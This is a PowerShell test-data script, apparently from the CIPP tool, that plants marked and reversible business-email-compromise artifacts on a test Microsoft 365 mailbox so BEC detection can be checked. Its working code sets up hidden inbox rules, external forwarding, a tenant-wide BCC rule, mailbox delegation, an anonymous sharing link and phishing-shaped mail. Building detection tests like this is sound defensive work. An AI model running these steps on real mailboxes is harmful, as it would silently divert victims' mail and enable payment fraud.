<#
.SYNOPSIS
    Plants a set of reversible "compromised mailbox" artifacts on a TEST account so a BEC run
    (Push-BECRun) lights up its checks and score, letting you test detection and the UI end to end.

.DESCRIPTION
    Dev/test tool for the Business Email Compromise workflow.

    By default it performs, as the tenant's SAM app, the mailbox-scoped actions an attacker leaves
    behind - every one reversible and tagged with a marker so -Cleanup finds and undoes exactly what
    it created:

      1. A suspicious inbox rule            -> Suspicious/New rules + rule-change signals (+5/+3/+3)
      2. External forwarding (keep a copy)  -> mailbox-state forwarding banner
      3. An external auto-reply             -> mailbox-state auto-reply
      4. A trusted-sender safelist entry    -> safelist-change signal (+2)
      5. FullAccess + SendAs delegation     -> permission-change / flagged-delegation signals  (needs -DelegateTo; accepts several)
      6. A BlindCopyTo transport rule       -> risky transport-rule-change signal (+4)          (opt-in -IncludeTransportRule; TENANT-WIDE)

    With -AsUser it ALSO signs in as the test user (device-code flow - one interactive sign-in as the
    victim, MFA-compatible, no password stored) and adds the actions the SAM app cannot do attributed
    to the user - these only fire the audit-log checks when the USER is the actor:

      7. A OneDrive "Anyone" sharing link   -> sharing-change + AnonymousLinks signal (+3)
      8. A user-created inbox rule          -> user-attributed inbox-rule change
      9. Mail sent as the user              -> sent-message activity (raise -BurstCount / -SendMailTo for mass mail)
     10. Phishing-shaped internal+external  -> sent-message + received/subject-pattern findings (opt-in -SendPhishingMail; external needs -PhishExternalTo)

    The core set (no switches) already crosses the High threshold. It reads and writes settings and,
    with -AsUser, uploads one text file and sends test mail (to the user themselves by default) - it
    never reads, deletes or purges real mail, and never touches another user's data.

    Requires a dev session: dot-source build/tools/Initialize-DevEnvironment.ps1 first, then run this.

    -AsUser prerequisites (each unmet one is skipped with the reason printed, so a partial run is fine):
      - the sign-in app must be consented for the delegated scopes it uses: Files.ReadWrite (OneDrive
        link), Mail.ReadWrite or MailboxSettings.ReadWrite (the rule), Mail.Send (sending). The default
        Microsoft Graph PowerShell app is often consented only for Mail.Send in a tenant - admin-consent
        the rest once (Entra > Enterprise applications > Microsoft Graph Command Line Tools > Permissions),
        or pass a -ClientId of an app that already has them. The run prints the scopes actually granted.
      - the test user must have a provisioned OneDrive for the sharing link (Identity > user >
        Pre-provision OneDrive, or open onedrive.com once as the user).
      - for an 'anonymous' link, "Anyone" sharing must be enabled in SharePoint (else -ShareScope organization).

    SAFETY: point it only at an account you own on a test tenant. -ForwardTo defaults to the RFC-2606
    reserved example.com, which cannot receive mail. The artifacts look malicious by design - run
    -Cleanup (add -AsUser to also remove the OneDrive file and user rule) when you are done.

.EXAMPLE
    # Core app-only set on a test mailbox
    ./New-BecSimTestData.ps1 -TenantFilter contoso.onmicrosoft.com -UserPrincipalName victim@contoso.onmicrosoft.com

.EXAMPLE
    # Everything, including the SharePoint link and user-attributed actions (sign in as the victim when prompted)
    ./New-BecSimTestData.ps1 -TenantFilter contoso.onmicrosoft.com -UserPrincipalName victim@contoso.onmicrosoft.com -DelegateTo attacker@contoso.onmicrosoft.com -IncludeTransportRule -AsUser

.EXAMPLE
    # Multi-user blast radius: delegate to two colleagues and send internal mail to three others, so the
    # case correlation graph shows several affected accounts fanning out from the victim.
    ./New-BecSimTestData.ps1 -TenantFilter contoso.onmicrosoft.com -UserPrincipalName victim@contoso.onmicrosoft.com -DelegateTo attacker@contoso.onmicrosoft.com,helpdesk@contoso.onmicrosoft.com -AsUser -SendMailTo cfo@contoso.onmicrosoft.com,ap@contoso.onmicrosoft.com,exec@contoso.onmicrosoft.com

.EXAMPLE
    # Add low-volume phishing-shaped mail: one internal (to self) and one external to an inbox you own
    ./New-BecSimTestData.ps1 -TenantFilter contoso.onmicrosoft.com -UserPrincipalName victim@contoso.onmicrosoft.com -AsUser -SendPhishingMail -PhishExternalTo you@personal.example

.EXAMPLE
    # Undo everything (add -AsUser to also remove the OneDrive link and user rule)
    ./New-BecSimTestData.ps1 -TenantFilter contoso.onmicrosoft.com -UserPrincipalName victim@contoso.onmicrosoft.com -AsUser -Cleanup
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$TenantFilter,

    # The test account to compromise. Use one you own on a test tenant.
    [Parameter(Mandatory = $true)]
    [string]$UserPrincipalName,

    # Where forwarding/BCC point. Defaults to an address that provably cannot receive mail.
    [string]$ForwardTo = 'bec-sim-exfil@example.com',

    # One or more test mailboxes to grant FullAccess + SendAs to. Each grantee is an account the victim
    # reaches, so they show as separate target nodes in the case correlation graph. Omitted = skip.
    [string[]]$DelegateTo,

    # Well-known low-visibility folder the app-only inbox rule files into (always-present Junk Email by
    # default; 'RSS Subscriptions' also trips the RSS breach banner but does not exist in every mailbox).
    [string]$MoveToFolder = 'Junk Email',

    # Also create a tenant-wide transport rule that blind-copies external. TENANT-WIDE, but reversible.
    [switch]$IncludeTransportRule,

    # Additionally sign in AS the test user (device-code flow) to add the SharePoint sharing link and
    # other user-attributed actions the SAM app cannot. One interactive sign-in as the victim.
    [switch]$AsUser,

    # Public client for the device-code sign-in. Defaults to the Microsoft Graph PowerShell app, which
    # needs no registration; the test user consents to Files/Mail scopes on first sign-in.
    [string]$ClientId = '14d82eec-204b-4c2f-b7e8-296a70dab67e',

    # Sharing-link scope. 'anonymous' (Anyone-with-the-link) trips AnonymousLinks (+3) and needs
    # "Anyone" sharing enabled; 'organization' is the fallback when it is not.
    [ValidateSet('anonymous', 'organization')]
    [string]$ShareScope = 'anonymous',

    # Recipients for the "sent as the user" burst. Internal recipients each show as a target node in the
    # case correlation graph (lateral movement). Defaults to the user themselves (stays internal).
    [string[]]$SendMailTo,

    # How many messages the -AsUser burst sends. Raise it (with 20+ -SendMailTo recipients) for mass mail.
    [int]$BurstCount = 3,

    # Also send low-volume phishing-shaped mail AS the user: one internal and (only if -PhishExternalTo
    # is set) one external. Subjects hit the payment/wire heuristics; bodies are plainly marked as a
    # simulation. Held to one message each so it does not trip outbound-spam protection. Needs -AsUser.
    [switch]$SendPhishingMail,

    # Internal recipient for the -SendPhishingMail internal message. Defaults to the victim themselves,
    # which also seeds a "received" phishing finding on their own mailbox.
    [string]$PhishInternalTo,

    # External recipient for the -SendPhishingMail external message - use a test inbox you own. Left
    # unset, the external send is skipped (the internal one still goes). Sending phishing-shaped mail to
    # real external recipients harms sender reputation and can get the user blocked; keep volume low.
    [string]$PhishExternalTo,

    # Undo everything tagged with the marker instead of creating it.
    [switch]$Cleanup
)

$ErrorActionPreference = 'Stop'
if (-not (Get-Command New-ExoRequest -ErrorAction SilentlyContinue)) {
    throw 'Dev session not initialized. Dot-source build/tools/Initialize-DevEnvironment.ps1 first.'
}

# One marker stamps every artifact so cleanup is exact and a human can spot them in the portal.
$Marker = 'CIPP-BEC-SIM'
$RuleName = "$Marker Invoice payment"          # app-only inbox rule (name trips the sensitive-name heuristic)
$TransportRuleName = "$Marker BlindCopy"
$MarkerDomain = 'bec-sim-marker.example'        # the safelist entry; harmless, easy to find
$SimFileName = "$Marker-exfil.txt"              # OneDrive file that carries the sharing link
$GraphRuleName = "$Marker Move to Deleted"      # inbox rule created AS the user (Graph)
$Exo = @{ tenantid = $TenantFilter }

# Run one action, report ok/fail without aborting the whole run.
function Invoke-Step {
    param([string]$Label, [scriptblock]$Action)
    try {
        & $Action
        Write-Host "  [ok]   $Label" -ForegroundColor Green
    } catch {
        Write-Host "  [fail] $Label -> $($_.Exception.Message)" -ForegroundColor Yellow
    }
}

# Device-code sign-in as the test user: prints a code, the operator signs in once as the victim, and
# we get a delegated Graph token. Raw OAuth so there is no module dependency.
function Get-BecSimUserToken {
    param([string]$Tenant, [string]$Client, [string]$Upn)
    $Scope = 'https://graph.microsoft.com/Files.ReadWrite https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/MailboxSettings.ReadWrite https://graph.microsoft.com/Mail.Send offline_access openid profile'
    $Device = Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/$Tenant/oauth2/v2.0/devicecode" -Body @{ client_id = $Client; scope = $Scope }
    Write-Host ''
    Write-Host $Device.message -ForegroundColor Yellow
    Write-Host "  -> sign in as the TEST user '$Upn' (the victim), not your own account." -ForegroundColor Cyan
    $TokenBody = @{ grant_type = 'urn:ietf:params:oauth:grant-type:device_code'; client_id = $Client; device_code = $Device.device_code }
    $Deadline = (Get-Date).AddSeconds([int]$Device.expires_in)
    while ((Get-Date) -lt $Deadline) {
        Start-Sleep -Seconds ([Math]::Max([int]$Device.interval, 3))
        try {
            return (Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/$Tenant/oauth2/v2.0/token" -Body $TokenBody -ErrorAction Stop).access_token
        } catch {
            $ErrCode = try { ($_.ErrorDetails.Message | ConvertFrom-Json).error } catch { '' }
            if ($ErrCode -in 'authorization_pending', 'slow_down') { continue }
            throw "Device-code sign-in failed: $ErrCode"
        }
    }
    throw 'Device-code sign-in timed out.'
}

# One delegated Graph v1.0 call with the user token.
function Invoke-BecSimGraph {
    param([string]$Method, [string]$Uri, $Body, [string]$Token)
    $Params = @{ Method = $Method; Uri = "https://graph.microsoft.com/v1.0$Uri"; Headers = @{ Authorization = "Bearer $Token" } }
    if ($null -ne $Body) { $Params.Body = ($Body | ConvertTo-Json -Depth 6); $Params.ContentType = 'application/json' }
    Invoke-RestMethod @Params
}

# The delegated scopes actually granted (the token's scp claim), so we can skip - with a clear reason -
# the actions the sign-in app was not consented for, instead of failing with a bare 403.
function Get-BecSimTokenScope {
    param([string]$Token)
    try {
        $Part = $Token.Split('.')[1].Replace('-', '+').Replace('_', '/')
        switch ($Part.Length % 4) { 2 { $Part += '==' } 3 { $Part += '=' } }
        return @(((([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Part))) | ConvertFrom-Json).scp -split ' ') | Where-Object { $_ })
    } catch { return @() }
}

if ($Cleanup) {
    Write-Host "Cleaning up $Marker artifacts on $UserPrincipalName ($TenantFilter)..." -ForegroundColor Cyan

    Invoke-Step "Remove inbox rule '$RuleName'" {
        $null = New-ExoRequest @Exo -Anchor $UserPrincipalName -cmdlet 'Remove-InboxRule' -cmdParams @{
            Identity = $RuleName; Force = $true; Confirm = $false
        }
    }
    Invoke-Step 'Clear forwarding' {
        $null = New-ExoRequest @Exo -Anchor $UserPrincipalName -cmdlet 'Set-Mailbox' -cmdParams @{
            Identity = $UserPrincipalName; ForwardingSMTPAddress = $null; ForwardingAddress = $null; DeliverToMailboxAndForward = $false
        }
    }
    Invoke-Step 'Disable auto-reply' {
        $null = New-ExoRequest @Exo -Anchor $UserPrincipalName -cmdlet 'Set-MailboxAutoReplyConfiguration' -cmdParams @{
            Identity = $UserPrincipalName; AutoReplyState = 'Disabled'
        }
    }
    Invoke-Step "Remove safelist entry '$MarkerDomain'" {
        $null = New-ExoRequest @Exo -Anchor $UserPrincipalName -cmdlet 'Set-MailboxJunkEmailConfiguration' -cmdParams @{
            Identity = $UserPrincipalName; TrustedSendersAndDomains = @{ '@odata.type' = '#Exchange.GenericHashTable'; Remove = $MarkerDomain }
        }
    }
    foreach ($Delegate in $DelegateTo) {
        Invoke-Step "Remove FullAccess for $Delegate" {
            $null = New-ExoRequest @Exo -Anchor $UserPrincipalName -cmdlet 'Remove-MailboxPermission' -cmdParams @{
                Identity = $UserPrincipalName; User = $Delegate; AccessRights = @('FullAccess'); Confirm = $false
            }
        }
        Invoke-Step "Remove SendAs for $Delegate" {
            $null = New-ExoRequest @Exo -Anchor $UserPrincipalName -cmdlet 'Remove-RecipientPermission' -cmdParams @{
                Identity = $UserPrincipalName; Trustee = $Delegate; AccessRights = @('SendAs'); Confirm = $false
            }
        }
    }
    Invoke-Step "Remove transport rule '$TransportRuleName'" {
        $null = New-ExoRequest @Exo -cmdlet 'Remove-TransportRule' -cmdParams @{ Identity = $TransportRuleName; Confirm = $false } -UseSystemMailbox $true
    }

    if ($AsUser) {
        Write-Host 'Signing in as the user to remove the OneDrive file and user inbox rule...' -ForegroundColor Cyan
        $Token = Get-BecSimUserToken -Tenant $TenantFilter -Client $ClientId -Upn $UserPrincipalName
        Invoke-Step "Delete OneDrive file '$SimFileName' (removes its sharing link)" {
            $null = Invoke-RestMethod -Method DELETE -Uri "https://graph.microsoft.com/v1.0/me/drive/root:/$SimFileName" -Headers @{ Authorization = "Bearer $Token" }
        }
        Invoke-Step "Remove user inbox rule '$GraphRuleName'" {
            $Rules = Invoke-BecSimGraph -Method GET -Uri '/me/mailFolders/inbox/messageRules' -Token $Token
            $Rule = @($Rules.value | Where-Object { $_.displayName -eq $GraphRuleName })[0]
            if ($Rule) { $null = Invoke-BecSimGraph -Method DELETE -Uri "/me/mailFolders/inbox/messageRules/$($Rule.id)" -Token $Token }
        }
    }

    Write-Host 'Cleanup done.' -ForegroundColor Cyan
    return
}

Write-Host "Planting $Marker artifacts on $UserPrincipalName ($TenantFilter)..." -ForegroundColor Cyan
Write-Host 'These look malicious by design. Run again with -Cleanup when finished.' -ForegroundColor DarkYellow

# 1. Suspicious inbox rule: sensitive name + files sensitive mail away into a low-visibility folder,
#    marks it read. Trips SuspiciousRules(+5) + NewRules(+3) + InboxRuleChanges(+3) on its own.
Invoke-Step "Create inbox rule '$RuleName' -> $MoveToFolder" {
    $null = New-ExoRequest @Exo -Anchor $UserPrincipalName -cmdlet 'New-InboxRule' -cmdParams @{
        Name                 = $RuleName
        Mailbox              = $UserPrincipalName
        SubjectContainsWords = @('invoice', 'payment', 'wire')
        MoveToFolder         = "${UserPrincipalName}:\$MoveToFolder"
        MarkAsRead           = $true
        StopProcessingRules  = $true
    }
}

# 2. External forwarding, keeping a copy so the user notices nothing.
Invoke-Step "Forward externally to $ForwardTo (keep a copy)" {
    $null = New-ExoRequest @Exo -Anchor $UserPrincipalName -cmdlet 'Set-Mailbox' -cmdParams @{
        Identity = $UserPrincipalName; ForwardingSMTPAddress = $ForwardTo; DeliverToMailboxAndForward = $true
    }
}

# 3. External auto-reply (a classic "I'm travelling, wire to this account" lure).
Invoke-Step 'Enable external auto-reply' {
    $null = New-ExoRequest @Exo -Anchor $UserPrincipalName -cmdlet 'Set-MailboxAutoReplyConfiguration' -cmdParams @{
        Identity         = $UserPrincipalName
        AutoReplyState   = 'Enabled'
        ExternalAudience = 'All'
        InternalMessage  = "$Marker automatic reply"
        ExternalMessage  = "$Marker automatic reply - please re-send payment details to my personal address."
    }
}

# 4. Trusted-sender safelist entry so the attacker's future mail skips junk filtering.
Invoke-Step "Add '$MarkerDomain' to trusted senders" {
    $null = New-ExoRequest @Exo -Anchor $UserPrincipalName -cmdlet 'Set-MailboxJunkEmailConfiguration' -cmdParams @{
        Identity = $UserPrincipalName; TrustedSendersAndDomains = @{ '@odata.type' = '#Exchange.GenericHashTable'; Add = $MarkerDomain }
    }
}

# 5. Delegation: FullAccess + SendAs to one or more mailboxes (persistence that survives a password
#    reset). Each grantee is an account the victim reaches, so they show as target nodes in the graph.
if ($DelegateTo) {
    foreach ($Delegate in $DelegateTo) {
        Invoke-Step "Grant $Delegate FullAccess" {
            $null = New-ExoRequest @Exo -Anchor $UserPrincipalName -cmdlet 'Add-MailboxPermission' -cmdParams @{
                Identity = $UserPrincipalName; User = $Delegate; AccessRights = @('FullAccess'); AutoMapping = $false; InheritanceType = 'All'; Confirm = $false
            }
        }
        Invoke-Step "Grant $Delegate SendAs" {
            $null = New-ExoRequest @Exo -Anchor $UserPrincipalName -cmdlet 'Add-RecipientPermission' -cmdParams @{
                Identity = $UserPrincipalName; Trustee = $Delegate; AccessRights = @('SendAs'); Confirm = $false
            }
        }
    }
} else {
    Write-Host '  [skip] delegation (pass -DelegateTo <one or more test mailboxes> to include it)' -ForegroundColor DarkGray
}

# 6. Tenant-wide transport rule that blind-copies everything to the exfil address. Opt-in.
if ($IncludeTransportRule) {
    Invoke-Step "Create transport rule '$TransportRuleName' (BlindCopyTo $ForwardTo)" {
        $null = New-ExoRequest @Exo -cmdlet 'New-TransportRule' -cmdParams @{
            Name = $TransportRuleName; FromScope = 'InOrganization'; BlindCopyTo = $ForwardTo; Comments = "$Marker - delete me"
        } -UseSystemMailbox $true
    }
} else {
    Write-Host '  [skip] transport rule (pass -IncludeTransportRule; it is tenant-wide)' -ForegroundColor DarkGray
}

# 7-9. As the user (device-code): the actions the SAM app cannot do attributed to the victim - a
#      OneDrive sharing link (only detected when the USER made it), a user-created inbox rule, and
#      sent mail.
if ($AsUser) {
    Write-Host ''
    Write-Host 'Signing in as the test user for the SharePoint link and user-attributed actions...' -ForegroundColor Cyan
    $Token = Get-BecSimUserToken -Tenant $TenantFilter -Client $ClientId -Upn $UserPrincipalName
    $Scopes = Get-BecSimTokenScope -Token $Token
    Write-Host "  granted delegated scopes: $($Scopes -join ', ')" -ForegroundColor DarkGray
    $HasFiles = @($Scopes | Where-Object { $_ -like 'Files.ReadWrite*' }).Count -gt 0
    $HasRuleScope = @($Scopes | Where-Object { $_ -in 'Mail.ReadWrite', 'MailboxSettings.ReadWrite' }).Count -gt 0
    $HasSend = @($Scopes | Where-Object { $_ -like 'Mail.Send*' }).Count -gt 0

    # OneDrive sharing link: needs Files.ReadWrite consent AND a provisioned OneDrive for the user.
    $HasOneDrive = $false
    if ($HasFiles) { try { $null = Invoke-BecSimGraph -Method GET -Uri '/me/drive?$select=id' -Token $Token; $HasOneDrive = $true } catch { $HasOneDrive = $false } }
    if (-not $HasFiles) {
        Write-Host "  [skip] OneDrive sharing link - the token has no Files.ReadWrite. Admin-consent the sign-in app (see -ClientId) for it, then re-run." -ForegroundColor DarkGray
    } elseif (-not $HasOneDrive) {
        Write-Host "  [skip] OneDrive sharing link - the test user has no OneDrive. Provision it (Identity > user > Pre-provision OneDrive, or open onedrive.com once as the user), then re-run." -ForegroundColor DarkGray
    } else {
        Invoke-Step "Upload OneDrive file and create a '$ShareScope' sharing link -> AnonymousLinks(+3)" {
            $Upload = Invoke-RestMethod -Method PUT -Uri "https://graph.microsoft.com/v1.0/me/drive/root:/${SimFileName}:/content" -Headers @{ Authorization = "Bearer $Token" } -Body "$Marker exfil test file" -ContentType 'text/plain'
            $null = Invoke-BecSimGraph -Method POST -Uri "/me/drive/items/$($Upload.id)/createLink" -Body @{ type = 'view'; scope = $ShareScope } -Token $Token
        }
    }

    # User-created inbox rule: needs Mail.ReadWrite or MailboxSettings.ReadWrite consent.
    if ($HasRuleScope) {
        Invoke-Step "Create inbox rule '$GraphRuleName' as the user (move to Deleted Items, mark read)" {
            $DelFolder = Invoke-BecSimGraph -Method GET -Uri '/me/mailFolders/deleteditems?$select=id' -Token $Token
            $null = Invoke-BecSimGraph -Method POST -Uri '/me/mailFolders/inbox/messageRules' -Body @{
                displayName = $GraphRuleName; sequence = 1; isEnabled = $true
                conditions  = @{ subjectContains = @('invoice', 'payment', 'wire') }
                actions     = @{ moveToFolder = $DelFolder.id; markAsRead = $true; stopProcessingRules = $true }
            } -Token $Token
        }
    } else {
        Write-Host "  [skip] user inbox rule - the token has no Mail.ReadWrite/MailboxSettings.ReadWrite. Admin-consent the sign-in app for it, then re-run." -ForegroundColor DarkGray
    }

    $Recipients = if ($SendMailTo) { $SendMailTo } else { @($UserPrincipalName) }
    if ($HasSend) {
        Invoke-Step "Send $BurstCount message(s) as the user to $($Recipients -join ', ')" {
            for ($i = 1; $i -le $BurstCount; $i++) {
                $null = Invoke-BecSimGraph -Method POST -Uri '/me/sendMail' -Body @{
                    message         = @{
                        subject      = "$Marker urgent wire request"
                        body         = @{ contentType = 'Text'; content = "$Marker simulation message $i" }
                        toRecipients = @($Recipients | ForEach-Object { @{ emailAddress = @{ address = $_ } } })
                    }
                    saveToSentItems = $true
                } -Token $Token
            }
        }
    } else {
        Write-Host "  [skip] sent-mail burst - the token has no Mail.Send. Admin-consent the sign-in app for it, then re-run." -ForegroundColor DarkGray
    }

    # Phishing-shaped internal + external mail (opt-in). One message each so a real user does not trip
    # Microsoft's outbound-spam protection; the body is plainly a simulation. Sent mail is NOT undone by
    # -Cleanup (it lives in Sent Items and the recipient mailboxes) - delete it by hand if you must.
    if ($SendPhishingMail) {
        if (-not $HasSend) {
            Write-Host "  [skip] phishing-shaped mail - the token has no Mail.Send. Admin-consent the sign-in app for it, then re-run." -ForegroundColor DarkGray
        } else {
            $PhishBody = "$Marker BEC simulation - an automated test message from CIPP's BEC simulation tool. Ignore it: no action is required and no real payment or transfer is being requested."
            $InternalTo = if ($PhishInternalTo) { $PhishInternalTo } else { $UserPrincipalName }
            Invoke-Step "Send an internal phishing-shaped email as the user to $InternalTo" {
                $null = Invoke-BecSimGraph -Method POST -Uri '/me/sendMail' -Body @{
                    message         = @{
                        subject      = "$Marker Urgent: approve the outstanding invoice payment today"
                        body         = @{ contentType = 'Text'; content = $PhishBody }
                        toRecipients = @(@{ emailAddress = @{ address = $InternalTo } })
                    }
                    saveToSentItems = $true
                } -Token $Token
            }
            if ($PhishExternalTo) {
                Invoke-Step "Send an external phishing-shaped email as the user to $PhishExternalTo" {
                    $null = Invoke-BecSimGraph -Method POST -Uri '/me/sendMail' -Body @{
                        message         = @{
                            subject      = "$Marker Wire transfer authorization - updated bank details"
                            body         = @{ contentType = 'Text'; content = $PhishBody }
                            toRecipients = @(@{ emailAddress = @{ address = $PhishExternalTo } })
                        }
                        saveToSentItems = $true
                    } -Token $Token
                }
            } else {
                Write-Host '  [skip] external phishing email (pass -PhishExternalTo <a test inbox you own>)' -ForegroundColor DarkGray
            }
        }
    }
} else {
    Write-Host '  [skip] SharePoint link + user-attributed actions (pass -AsUser to sign in as the victim)' -ForegroundColor DarkGray
}

Write-Host ''
Write-Host 'Done. Now run a BEC investigation against this user in CIPP and confirm the checks light up.' -ForegroundColor Cyan
[PSCustomObject]@{
    TenantFilter      = $TenantFilter
    UserPrincipalName = $UserPrincipalName
    Marker            = $Marker
    InboxRule         = $RuleName
    ForwardTo         = $ForwardTo
    SafelistDomain    = $MarkerDomain
    Delegation        = if ($DelegateTo) { $DelegateTo -join ', ' } else { '(skipped)' }
    TransportRule     = if ($IncludeTransportRule) { $TransportRuleName } else { '(skipped)' }
    SharePointLink    = if ($AsUser) { "$SimFileName ($ShareScope)" } else { '(skipped; pass -AsUser)' }
    UserInboxRule     = if ($AsUser) { $GraphRuleName } else { '(skipped; pass -AsUser)' }
    SentAsUser        = if ($AsUser) { "$BurstCount message(s)" } else { '(skipped; pass -AsUser)' }
    PhishingMail      = if ($AsUser -and $SendPhishingMail) { "internal$(if ($PhishExternalTo) { ' + external' } else { ' only (pass -PhishExternalTo for external)' })" } else { '(skipped; pass -AsUser -SendPhishingMail)' }
    Cleanup           = 'Re-run with -Cleanup (add -AsUser to remove the OneDrive file and user rule). Sent mail is not auto-undone.'
}
